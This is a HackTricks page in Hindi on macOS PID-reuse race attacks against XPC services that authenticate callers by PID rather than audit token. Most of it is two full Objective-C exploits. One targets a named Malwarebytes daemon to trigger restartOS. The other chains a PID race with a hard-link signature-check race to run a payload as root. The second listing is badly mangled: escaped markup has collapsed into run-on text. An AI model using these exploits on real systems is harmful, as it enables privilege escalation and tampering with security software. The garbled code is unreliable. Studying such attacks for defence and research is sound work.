# macOS PID Reuse

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सदस्यता योजनाएं देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)\*\* पर फॉलो\*\* करें।
* **अपने हैकिंग ट्रिक्स साझा करें** द्वारा **PR जमा करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## PID पुनः उपयोग

जब एक macOS **XPC सेवा** कॉल्ड प्रोसेस पर **PID** पर आधारित नहीं है और **ऑडिट टोकन** पर नहीं, तो यह **PID पुनः उपयोग हमले** के लिए विकल्पशील होता है। यह हमला एक **रेस कंडीशन** पर आधारित है जहां एक **एक्सप्लॉइट** **XPC सेवा को संदेश भेजेगा** फ़ंक्शनैलिटी का दुरुपयोग करते हुए और **बस उसके बाद**, **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** को चलाएगा **अनुमति दी गई** बाइनरी।

यह फ़ंक्शन **अनुमति दी गई बाइनरी को PID स्वामित करेगा** लेकिन **दुर्भाग्यपूर्ण XPC संदेश** बस उससे पहले भेज दिया जाएगा। इसलिए, अगर **XPC** सेवा **भेजने वाले को प्रमाणित** करने के लिए **PID** का उपयोग करती है और यह **`posix_spawn`** के निष्पादन के **बाद** जांच करती है, तो यह सोचेगी कि यह किसी **अधिकृत** प्रक्रिया से आया है।

### एक्सप्लॉइट उदाहरण

यदि आपको फ़ंक्शन **`shouldAcceptNewConnection`** या उसके द्वारा कॉल किए जाने वाले फ़ंक्शन में **`processIdentifier`** मिलता है और **`auditToken`** को नहीं कॉल किया जाता है। तो यह अधिक संभावना है कि यह **प्रक्रिया PID** की पुष्टि कर रहा है और ऑडिट टोकन नहीं।\
जैसे कि उदाहरण के लिए इस छवि में (संदर्भ से लिया गया):

<figure><img src="../../../../../../.gitbook/assets/image (4) (1) (1) (1) (2).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

इस उदाहरण एक्सप्लॉइट (फिर से, संदर्भ से लिया गया) की जाँच करें ताकि एक्सप्लॉइट के 2 हिस्से देख सकें:

* एक जो **कई फोर्क्स उत्पन्न** करेगा
* **प्रत्येक फोर्क** XPC सेवा को **पेलोड** भेजेगा जबकि **संदेश भेजने के बाद** **`posix_spawn`** को निष्पादित करेगा।

{% hint style="danger" %}
एक्सप्लॉइट काम करने के लिए ` export`` `` `**`OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES`** या एक्सप्लॉइट में डालना महत्वपूर्ण है:

```objectivec
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");
```
{% endhint %}

पहला विकल्प **`NSTasks`** का उपयोग करके और तर्क का उपयोग करके बच्चों को उत्पीड़ित करने के लिए लॉन्च करें

```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```

इस उदाहरण में एक कच्चा \*\*\`fork\`\*\* उपयोग किया गया है \*\*जो PID रेस कंडीशन का शिकार होने वाले बच्चों को लॉन्च करने के लिए\*\* और फिर \*\*एक और रेस कंडीशन का शिकार होने के लिए हार्ड लिंक के माध्यम से उत्पीड़न करें:\*\* \`\`\`objectivec // export OBJC\_DISABLE\_INITIALIZE\_FORK\_SAFETY=YES // gcc -framework Foundation expl.m -o expl

\#include \<Foundation/Foundation.h> #include \<spawn.h> #include \<pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS @protocol HelperProtocol

* (void)DoSomething:(void (^)(\_Bool))arg1; @end

// Global flag to track exploitation status bool pwned = false;

/\*\*

* Continuously overwrite the contents of the 'hard\_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload. \*/ void \*check\_race(void \*arg) { while(!pwned) { // Overwrite with contents of the legit binary system("cat ./legit\_bin > hard\_link"); usleep(50000);

// Overwrite with contents of the payload to execute // TODO: COMPILE YOUR OWN PAYLOAD BIN system("cat ./payload > hard\_link"); usleep(50000); } return NULL; }

void child\_xpc\_pid\_rc\_abuse(){ // TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION #define kValid "./Legit Updater.app/Contents/MacOS/Legit" extern char \*\*environ;

// Connect with XPC service // TODO: CHANGE THE ID OF THE XPC TO EXPLOIT NSString\* service\_name = @"com.example.Helper"; NSXPCConnection\* connection = \[\[NSXPCConnection alloc] initWithMachServiceName:service\_name options:0x1000]; // TODO: CNAGE THE PROTOCOL NAME NSXPCInterface\* interface = \[NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)]; \[connection setRemoteObjectInterface:interface]; \[connection resume];

id obj = \[connection remoteObjectProxyWithErrorHandler:^(NSError\* error) { NSLog(@"\[-] Something went wrong"); NSLog(@"\[-] Error: %@", error); }];

NSLog(@"obj: %@", obj); NSLog(@"conn: %@", connection);

// Call vulenrable XPC function // TODO: CHANEG NAME OF FUNCTION TO CALL \[obj DoSomething:^(\_Bool b){ NSLog(@"Response, %hdd", b); }];

// Change current process to the legit binary suspended char target\_binary\[] = kValid; char \*target\_argv\[] = {target\_binary, NULL}; posix\_spawnattr\_t attr; posix\_spawnattr\_init(\&attr); short flags; posix\_spawnattr\_getflags(\&attr, \&flags); flags |= (POSIX\_SPAWN\_SETEXEC | POSIX\_SPAWN\_START\_SUSPENDED); posix\_spawnattr\_setflags(\&attr, flags); posix\_spawn(NULL, target\_binary, NULL, \&attr, target\_argv, environ); }

/\*\*

* Function to perform the PID race condition using children calling the XPC exploit. \*/ void xpc\_pid\_rc\_abuse() { #define RACE\_COUNT 1 extern char \*\*environ; int pids\[RACE\_COUNT];

// Fork child processes to exploit for (int i = 0; i < RACE\_COUNT; i++) { int pid = fork(); if (pid == 0) { // If a child process child\_xpc\_pid\_rc\_abuse(); } printf("forked %d\n", pid); pids\[i] = pid; }

// Wait for children to finish their tasks sleep(3);

// Terminate child processes for (int i = 0; i < RACE\_COUNT; i++) { if (pids\[i]) { kill(pids\[i], 9); } } }

int main(int argc, const char \* argv\[]) { // Create and set execution rights to 'hard\_link' file system("touch hard\_link"); system("chmod +x hard\_link");

// Create thread to exploit sign verification RC pthread\_t thread; pthread\_create(\&thread, NULL, check\_race, NULL);

while(!pwned) { // Try creating 'download' directory, ignore errors system("mkdir download 2>/dev/null");

// Create a hardlink // TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC system("ln hard\_link download/legit\_bin");

xpc\_pid\_rc\_abuse(); usleep(10000);

// The payload will generate this file if exploitation is successfull if (access("/tmp/pwned", F\_OK ) == 0) { pwned = true; } }

return 0; }

```
## संदर्भ

* [https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
* [https://saelo.github.io/presentations/warcon18\_dont\_trust\_the\_pid.pdf](https://saelo.github.io/presentations/warcon18\_dont\_trust\_the\_pid.pdf)

<details>

<summary><strong>जीरो से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **जुड़ें** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या **मुझे** ट्विटर पर **फॉलो** करें 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपने हैकिंग ट्रिक्स साझा करें।

</details>
```
